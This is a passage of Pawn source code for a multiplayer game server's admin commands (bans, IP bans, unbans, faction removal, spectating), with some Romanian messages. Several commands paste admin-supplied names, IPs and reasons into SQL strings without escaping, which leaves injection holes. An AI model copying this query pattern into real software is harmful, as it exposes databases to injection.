				PlayerInfo[id][pFACWarns] = 0;
				PlayerInfo[id][pFactionTime] = 0;
				PlayerInfo[id][pModel] = 250;
				gTeam[id] = 3;
				PlayerInfo[id][pTeam] = 3;
				OnDuty[id] = 0;
				tazer[id] = 0;
				SetPlayerArmourEx(id, 0);
    			SetPlayerSkin(id,PlayerInfo[id][pModel]);
				SpawnPlayer(id);
				new str[256];
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Member`='0',`Leader`='0',`Rank`='0',`Model`='250',`FWarn`='0',`FPunish`='%d',`Team`='3', `FactionTime`='0',`ALeader`='0' WHERE `name`='%s'",PlayerInfo[id][pFpunish],PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,str,"","");
				return 1;
			}
		}
		else
 		{
             SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:auninviteoff(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		new id[30], fp,sendername[25],string[MAX_STRING],reason[64],rank,ftime,faction,idd,query[500],string2[500];
		if(sscanf(params, "s[25]is[64]", id, fp, reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/auninviteoff <Name> <FPunish> <Reason>");
		format(string, sizeof(string), "SELECT `Member` FROM `users` WHERE LOWER(name) = LOWER('%s') LIMIT 1", id);
		new Cache: r = mysql_query ( SQL, string );
		if ( cache_get_row_count ( ) )
		{
			new fostfactiune = cache_get_row_int ( 0, 0 );
			cache_delete ( r );
			if(fostfactiune == 0)
			{
				SendClientMessage(playerid, COLOR_SERVER, "Acest jucator nu este intr-o factiune.");
				return 1;
			}
			format(query, sizeof(query), "SELECT * FROM `users` WHERE `name`='%s'",id);
			new Cache: membresult = mysql_query(SQL, query);
			for(new i, j = cache_get_row_count (); i != j; ++i)
			{
				idd = cache_get_field_content_int(i, "id");
				rank = cache_get_field_content_int(i, "Rank");
				ftime = cache_get_field_content_int(i, "FactionTime");
				faction = cache_get_field_content_int(i, "id");
			}
			cache_delete(membresult);
			if(fp == 0)
			{
   				GetPlayerName(playerid, sendername, sizeof(sendername));
			    format(string, sizeof(string), "* L-ai dat pe %s afara din factiunea sa fara FP.", id);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				mysql_format(SQL,string,sizeof(string),"UPDATE users SET `Team`='3',`Member`='0',`Leader`='0',`Rank`='0',`Model`='250',`FPunish`='0',`FWarn`='0',`FactionTime`='0',`ALeader`='0' WHERE `name`='%s'",id);
				mysql_tquery(SQL,string,"","");
				format(string2, sizeof(string2), "%s was uninvited by Admin %s from faction %s (rank %d) after %d days, without FP. Reason: %s.",id,sendername,DynamicFactions[faction][fName],rank,ftime,reason);
				mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`,`player`,`leader`) VALUES ('%s','%d','%d')", string2, idd, PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL,query,"","");
			}
			else if(fp >= 1)
			{
   				GetPlayerName(playerid, sendername, sizeof(sendername));
			    format(string, sizeof(string), "* L-ai dat pe %s afara din factiunea sa cu %d FP.", id,fp);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				mysql_format(SQL,string,sizeof(string),"UPDATE users SET `Team`='3',`Member`='0',`Leader`='0',`Rank`='0',`Model`='250',`FPunish`='%d',`FWarn`='0',`FactionTime`='0',`ALeader`='0' WHERE `name`='%s'",fp,id);
				mysql_tquery(SQL,string,"","");
				format(string2, sizeof(string2), "%s was uninvited by Admin %s from faction %s (rank %d) after %d days, with %d FP. Reason: %s.",id,sendername,DynamicFactions[faction][fName],rank,ftime,fp,reason);
				mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`,`player`,`leader`) VALUES ('%s','%d','%d')", string2, idd, PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL,query,"","");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "This player does not exist.");
			cache_delete ( r );
			return 1;
		}
	}
	return 1;
}
CMD:dmg(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 1)
		{
		    if(DMGadmin[playerid] == 0)
		    {
		        DMGadmin[playerid] = 1;
		        SCM(playerid, -1, "Damage did on");
		    }
			else
			{
			    DMGadmin[playerid] = 0;
			    SCM(playerid, -1, "Damage did off");
			}
		}
	}
	return 1;
}
CMD:ban(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(gPlayerLogged[playerid] > 0)
 	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			new id,reason[128],string[200],giveplayer[30],sendername[30],days,str[1400],playerip[16],year,month,day,hour,minute,second,time;
			if(sscanf(params, "uds[128]", id,days,reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/ban <Name/Playerid> <days(0=permanent)> <reason>");
			if(days < 0) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/ban <Name/Playerid> <days(0=permanent)> <reason>");
			if(IsPlayerConnected(id))
			{
			        getdate(year, month, day);
			        gettime(hour, minute, second);
       				GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					GetPlayerIp(id, playerip, sizeof(playerip));
					if(PlayerInfo[id][pAdmin] >= PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid, COLOR_GREY, "You can't ban a higher (or equal) level administrator.");
					if(days == 0)
					{
					    format(string,sizeof(string),"{FF6347}Ban: %s has been permanent banned by %s, reason: %s",giveplayer,sendername,reason);
					    SendClientMessageToAll(COLOR_ERROR, string);
					    mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', '%s', 0, 0, 1, 1, 0)",
						PlayerInfo[id][pNormalName],PlayerInfo[playerid][pNormalName],reason,playerip);
						mysql_tquery(SQL,str,"","");
						new var100[256];
	    				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','1','0','%s','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],reason,giveplayer,sendername);
						mysql_tquery(SQL,var100,"","");
						KickEx(id);
						banuriinminut[playerid] += 1;
						if(limitabanuri[playerid] <= 0) limitabanuri[playerid] = 60;
					}
					if(days > 0)
					{
						time = gettime() + (days*86400);
					    format(string,sizeof(string),"{FF6347}Ban: %s has been banned by %s for %d days, reason: %s",giveplayer,sendername,days,reason);
					    SendClientMessageToAll(COLOR_ERROR, string);
					    mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', '%s', %d, 0, 0, 1, %d)",
						PlayerInfo[id][pNormalName],PlayerInfo[playerid][pNormalName],reason,playerip,days,time);
						mysql_tquery(SQL,str,"","");
						new var100[256];
	    				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','2','%d','%s','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],days,reason,giveplayer,sendername);
						mysql_tquery(SQL,var100,"","");
						KickEx(id);
						banuriinminut[playerid] += 1;
						if(limitabanuri[playerid] <= 0) limitabanuri[playerid] = 60;
					}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:bann(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(gPlayerLogged[playerid] > 0)
 	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			new id,reason[128],string[200],giveplayer[30],sendername[30],days,str[1400],playerip[16],year,month,day,hour,minute,second,time;
			if(sscanf(params, "uds[128]", id,days,reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/ban <Name/Playerid> <days(0=permanent)> <reason>");
			if(days < 0) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/ban <Name/Playerid> <days(0=permanent)> <reason>");
			if(IsPlayerConnected(id))
			{
			        getdate(year, month, day);
			        gettime(hour, minute, second);
       				GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					GetPlayerIp(id, playerip, sizeof(playerip));
					if(PlayerInfo[id][pAdmin] >= PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid, COLOR_GREY, "You can't ban a higher (or equal) level administrator.");
					if(days == 0)
					{
					    format(string,sizeof(string),"{FF6347}Ban: %s has been permanent banned by %s, reason: %s",giveplayer,sendername,reason);
					    SendClientMessageToAll(COLOR_ERROR, string);
					    mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', '%s', 0, 0, 1, 1, 0)",
						PlayerInfo[id][pNormalName],PlayerInfo[playerid][pNormalName],reason,playerip);
						mysql_tquery(SQL,str,"","");
						new var100[256];
	    				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','1','0','%s','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],reason,giveplayer,sendername);
						mysql_tquery(SQL,var100,"","");
						KickEx(id);
						banuriinminut[playerid] += 1;
						if(limitabanuri[playerid] <= 0) limitabanuri[playerid] = 60;
					}
					if(days > 0)
					{
						time = gettime() + (days*86400);
					    format(string,sizeof(string),"{FF6347}Ban: %s has been banned by %s for %d days, reason: %s",giveplayer,sendername,days,reason);
					    SendClientMessageToAll(COLOR_ERROR, string);
					    mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', '%s', %d, 0, 0, 1, %d)",
						PlayerInfo[id][pNormalName],PlayerInfo[playerid][pNormalName],reason,playerip,days,time);
						mysql_tquery(SQL,str,"","");
						new var100[256];
	    				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','2','%d','%s','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],days,reason,giveplayer,sendername);
						mysql_tquery(SQL,var100,"","");
						KickEx(id);
						banuriinminut[playerid] += 1;
						if(limitabanuri[playerid] <= 0) limitabanuri[playerid] = 60;
					}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:banoff(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 1)
		{
			new id[30],reason[128],string[200],sendername[30],days,str[1400],year,month,day,hour,minute,second,time,cont,qstr[500],playeridd,result[500];
			if(sscanf(params, "s[30]ds[128]", id,days,reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/banoff <Name> <days(0=permanent)> <reason>");
			if(days < 0) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/banoff <Name> <days(0=permanent)> <reason>");
            cont = MySQLCheckAccount(id);
        	if(cont == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name does not exist.");
	        getdate(year, month, day);
	        gettime(hour, minute, second);
	        GetPlayerName(playerid, sendername, sizeof(sendername));
	        format(qstr,sizeof(qstr),"SELECT * FROM bans WHERE `PlayerName`='%s' AND `Active`='1'",id);
    		new Cache: banuri = mysql_query(SQL,qstr);
    		if(cache_get_row_count() > 0)
    		{
    		    SendClientMessage(playerid, COLOR_ERROR, "This player is already banned.");
			}
			else
			{
				format(qstr, sizeof(qstr), "SELECT `id` FROM users WHERE `name` = '%s'", id);
				mysql_store_result();
				mysql_query(SQL,qstr);
				if(mysql_retrieve_row())
				{
					mysql_fetch_field_row(result, "id"); playeridd = strval( result );
				}
				mysql_free_result();
				if(days == 0)
				{
					format(string,sizeof(string),"{FF6347}Offline: {FF6347}Ban: %s has been permanent banned by %s, reason: %s.",id,sendername,reason);
   					SendClientMessageToAll(COLOR_ERROR, string);
					mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', '0', 0, 0, 1, 1, 0)",
					id,PlayerInfo[playerid][pNormalName],reason);
					mysql_tquery(SQL,str,"","");
					new var100[256];
					mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','1','0','%s','%s','%s')", playeridd,PlayerInfo[playerid][pSQLID],reason,id,sendername);
					mysql_tquery(SQL,var100,"","");
				}
				if(days > 0)
				{
					time = gettime() + (days*86400);
					format(string,sizeof(string),"{FF6347}Offline: {FF6347}Ban: %s has been banned by %s for %d days, reason: %s.",id,sendername,days,reason);
   					SendClientMessageToAll(COLOR_ERROR, string);
					mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', '0', %d, 0, 0, 1, %d)",
					id,PlayerInfo[playerid][pNormalName],reason,days,time);
					mysql_tquery(SQL,str,"","");
					new var100[256];
					mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','2','%d','%s','%s','%s')", playeridd,PlayerInfo[playerid][pSQLID],days,reason,id,sendername);
					mysql_tquery(SQL,var100,"","");
				}
			}
			cache_delete(banuri);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:banip(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			new id,reason[128],string[200],giveplayer[30],sendername[30],days,str[1400],playerip[16],year,month,day,hour,minute,second,time;
			if(sscanf(params, "uds[128]", id,days,reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/banip <Name/Playerid> <days(0=permanent)> <reason>");
			if(days < 0) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/banip <Name/Playerid> <days(0=permanent)> <reason>");
			if(IsPlayerConnected(id))
			{

			        getdate(year, month, day);
			        gettime(hour, minute, second);
       				GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					GetPlayerIp(id, playerip, sizeof(playerip));
					if(PlayerInfo[id][pAdmin] >= PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid, COLOR_GREY, "You can't ban a higher (or equal) level administrator.");
					if(days == 0)
					{
					    format(string,sizeof(string),"{FF6347}IP {FF6347}Ban: %s has been permanent banned by %s, reason: %s.",giveplayer,sendername,reason);
					    SendClientMessageToAll(COLOR_ERROR, string);
					    mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', '%s', 0, 1, 1, 1, 0)",
						PlayerInfo[id][pNormalName],PlayerInfo[playerid][pNormalName],reason,playerip);
						mysql_tquery(SQL,str,"","");
						new var100[256];
	    				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`playername`,`givername`) VALUES ('%d','%d','3','0','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],giveplayer,sendername);
						mysql_tquery(SQL,var100,"","");
						KickEx(id);
						banuriinminut[playerid] += 1;
						if(limitabanuri[playerid] <= 0) limitabanuri[playerid] = 60;
					}
					if(days > 0)
					{
					    time = gettime() + (days*86400);
					    format(string,sizeof(string),"IP {FF6347}Ban: %s has been banned by %s for %d days, reason: %s.",giveplayer,sendername,days,reason);
					    SendClientMessageToAll(COLOR_ERROR, string);
					    mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', '%s', %d, 1, 0, 1, %d)",
						PlayerInfo[id][pNormalName],PlayerInfo[playerid][pNormalName],reason,playerip,days,time);
						mysql_tquery(SQL,str,"","");
						new var100[256];
	    				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`playername`,`givername`) VALUES ('%d','%d','4','%d','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],days,giveplayer,sendername);
						mysql_tquery(SQL,var100,"","");
						KickEx(id);
						banuriinminut[playerid] += 1;
						if(limitabanuri[playerid] <= 0) limitabanuri[playerid] = 60;
					}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:banipp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 1)
		{
			new ip[16],reason[128],string[200],sendername[30],str[1400],year,month,day,hour,minute,second,playerip[16],qstr[500];
			if(sscanf(params, "s[16]s[128]", ip, reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/banipp <IP> <reason>");
   			getdate(year, month, day);
      		gettime(hour, minute, second);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(qstr,sizeof(qstr),"SELECT * FROM bans WHERE `IP`='%s' AND `Active`='1'",ip);
    		new Cache: banuri = mysql_query(SQL,qstr);
    		if(cache_get_row_count() > 0)
    		{
    		    SendClientMessage(playerid, COLOR_ERROR, "This IP is already banned.");
			}
			else
			{
				format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}%s has banned IP %s, reason: %s.",sendername,ip,reason);
    			SendClientMessageToAll(COLOR_AdminWarn, string);
			    mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (AdminName, Reason, IP, Year, Month, Day, Hour, Minute, Second, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', %d, %d, %d, %d, %d, %d, 0, 1, 1, 1, 0)",
				PlayerInfo[playerid][pNormalName],reason,ip,year,month,day,hour,minute,second);
				mysql_tquery(SQL,str,"","");
				foreach(Player, i)
				{
				    GetPlayerIp(i, playerip, sizeof(playerip));
     				if(!strcmp(ip, playerip, true))
     				{
						KickEx(i);
					}
				}
			}
			cache_delete(banuri);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:unban(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if(PlayerInfo[playerid][pAdmin] >= 3)
		{
		    new id[30],cont,str1[256],string[128],sendername[30],qstr[256];
			if(sscanf(params, "s[30]", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/unban <Name>");
			cont = MySQLCheckAccount(id);
	        if(cont == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name does not exist.");
	        format(qstr,sizeof(qstr),"SELECT * FROM bans WHERE `PlayerName`='%s' AND `Active`='1'",id);
    		new Cache: banuri = mysql_query(SQL,qstr);
    		if(cache_get_row_count() > 0)
    		{
    		    GetPlayerName(playerid, sendername, sizeof(sendername));
    		    format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}%s has unbanned user %s.",sendername,id);
    		    ABroadCast(COLOR_AdminWarn, string,1);
			    mysql_format(SQL,str1,sizeof(str1),"UPDATE bans SET `Active`='0' WHERE `PlayerName`='%s'",id);
				mysql_tquery(SQL,str1,"","");
			}
			else
			{
			    SendClientMessage(playerid, COLOR_ERROR, "This player is not banned.");
			}
			cache_delete(banuri);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:unbanip(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if(PlayerInfo[playerid][pAdmin] >= 3)
		{
		    new ip[16],str1[256],string[256],sendername[30],qstr[256];
			if(sscanf(params, "s[16]", ip)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/unbanip <IP>");
	        format(qstr,sizeof(qstr),"SELECT * FROM bans WHERE `IP`='%s' AND `Active`='1'",ip);
    		new Cache: banuri = mysql_query(SQL,qstr);
    		if(cache_get_row_count() > 0)
    		{
    		    GetPlayerName(playerid, sendername, sizeof(sendername));
    		    format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}%s has unbanned IP %s.",sendername,ip);
    		    ABroadCast(COLOR_AdminWarn, string,1);
			    mysql_format(SQL,str1,sizeof(str1),"UPDATE bans SET `Active`='0' WHERE `IP`='%s'",ip);
				mysql_tquery(SQL,str1,"","");
			}
			else
			{
			    SendClientMessage(playerid, COLOR_ERROR, "This IP is not banned.");
			}
			cache_delete(banuri);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
/*CMD:getip(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new id,playersip[256],giveplayer[30],string[256];
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		if(sscanf(params, "u", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/getip <Name/Playerid>");
		{
			GetPlayerName(id, giveplayer, sizeof(giveplayer));
			if(id != INVALID_PLAYER_ID)
	        {
				GetPlayerIp(id,playersip,sizeof(playersip));
				format(string, sizeof(string), "Player: %s (%d) IP: %s",giveplayer,id,playersip);
				SendClientMessage(playerid,COLOR_GRAD2,string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}*/
CMD:am(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if (PlayerInfo[playerid][pAdmin] >= 5)
	{
		new msjam[250],string[250];
		if(sscanf(params, "s[250]", msjam)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/am <Message>");
		format(string, sizeof(string), "ADMIN: %s", msjam);
		OOCOff(COLOR_LIGHTBLUE,string);
		printf("%s", string);
  	}
	else
	{
		SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:agivemats(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if (PlayerInfo[playerid][pAdmin] >= 4)
	{
	   	if(IsPlayerConnected(playerid))
    	{
			new string[256],id,mats,giveplayer[30],sendername[MAX_PLAYER_NAME];
			if(sscanf(params, "ui", id,mats)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/agivemats <Name/Playerid> <Mats>");
			GetPlayerName(id, giveplayer, sizeof(giveplayer));
   			{
		    	PlayerInfo[id][pMats] += mats;
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "Admin %s has given to %s %d materials.", sendername,giveplayer,mats);
				ABroadCast(COLOR_RED,string,1);
				new str[128];
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Mats`='%d' WHERE `name`='%s'",PlayerInfo[id][pMats],PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:setage(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			new string[256],id,age,giveplayer[30],sendername[MAX_PLAYER_NAME];
			if(sscanf(params, "ui", id,age)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/setage <Name/Playerid> <age>");
			GetPlayerName(id, giveplayer, sizeof(giveplayer));
			{
			    if(IsPlayerConnected(id))
			    {
			        if(IsPlayerConnected(id))
			        {
						PlayerInfo[id][pAge] = age;
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "Admin %s set %s's age to: %d.", sendername,giveplayer,age);
						ABroadCast(COLOR_YELLOW,string,1);
						new str[128];
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Age`='%d' WHERE `name`='%s'",PlayerInfo[id][pAge],PlayerInfo[id][pNormalName]);
						mysql_tquery(SQL,str,"","");
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:spec(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			new id,giveplayer[25],string[256],sendername[25];
			if(sscanf(params, "u", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/spec <Name/Playerid>");
			if(IsPlayerConnected(id))
			{
				if(IsPlayerConnected(id))
				{
				    if(IsPlayerConnected(id))
				    {
						if(Spectate[playerid] == -1)
						{
							BeforeSpectate[playerid][pState] = GetPlayerState(playerid);
							BeforeSpectate[playerid][pWorld] = GetPlayerVirtualWorld(playerid);
							BeforeSpectate[playerid][pInt] = GetPlayerInterior(playerid);
							BeforeSpectate[playerid][pSpectating] = true;
							new Float: x, Float: y, Float: z;
							GetPlayerPos(playerid, x, y, z);

							if(!IsPlayerInAnyVehicle(playerid))
							{
								BeforeSpectate[playerid][pOldPos][0] = x;
								BeforeSpectate[playerid][pOldPos][1] = y;
								BeforeSpectate[playerid][pOldPos][2] = z;
							}
							else BeforeSpectate[playerid][pInVehicle] = GetPlayerVehicleID(playerid);
						}
						p_ac[playerid] = 1;
				        Spectate[playerid] = id;
						new Float:health;
						GetPlayerHealthEx(Spectate[playerid], health);
						GetPlayerName(Spectate[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						if(reportreason[id] == 0)
						{
							format(string, sizeof(string), "Admin %s is now spectating %s.",sendername,giveplayer);
						}
						else if(reportreason[id] == 1)
						{
							format(string, sizeof(string), "Admin %s is now spectating %s (reported for being stuck).",sendername,giveplayer);
						}
						else if(reportreason[id] == 2)
						{
							format(string, sizeof(string), "Admin %s is now spectating %s (reported for DM).",sendername,giveplayer);
						}
						ReportTime[id] = 0;
						format(reporttext[id], 30, "NULL");
						reportcheater[id] = -1;
						reportreason[id] = 0;
						if(playerreported[id] != -1)
						{
							reportreason[playerreported[id]] = 0;
						}
						playerreported[id] = -1;
						timerreport[id] = -1;
						ABroadCast(COLOR_YELLOW,string,1);
						format(string, sizeof(string), "(%d) %s | Level: %d | Health: %.0f | AFK: %d | Duty: %d.",Spectate[playerid],giveplayer,PlayerInfo[Spectate[playerid]][pLevel],health,IsPlayerAFK[Spectate[playerid]],OnDuty[Spectate[playerid]]);
						SendClientMessage(playerid, COLOR_ERROR, string);
						TogglePlayerSpectating(playerid, 1);
						if(IsPlayerInAnyVehicle(Spectate[playerid]))
						{
						    new carid = GetPlayerVehicleID(Spectate[playerid]);
						    PlayerSpectateVehicle(playerid, carid);
							SpectateState[id] = 2;
						}
						else
						{
						    PlayerSpectatePlayer(playerid, Spectate[playerid]);
							SpectateState[id] = 1;
						}
						PlayerTextDrawSetString(playerid, TextDrawSpec[playerid][1], "LOADING...");
						PlayerTextDrawShow(playerid, TextDrawSpec[playerid][1]);
						SelectTextDraw(playerid, 0xFF0000FF);
						format(string, sizeof(string), "%s_(%d,%d)",PlayerInfo[id][pNormalName],PlayerInfo[id][pLevel], PlayerInfo[id][pConnectTime]);
						PlayerTextDrawSetString(playerid, SpecTD[2], string);
						for(new i = 0; i < sizeof(SpecTD); i++) PlayerTextDrawShow(playerid, SpecTD[i]);
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				}
			}
   		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
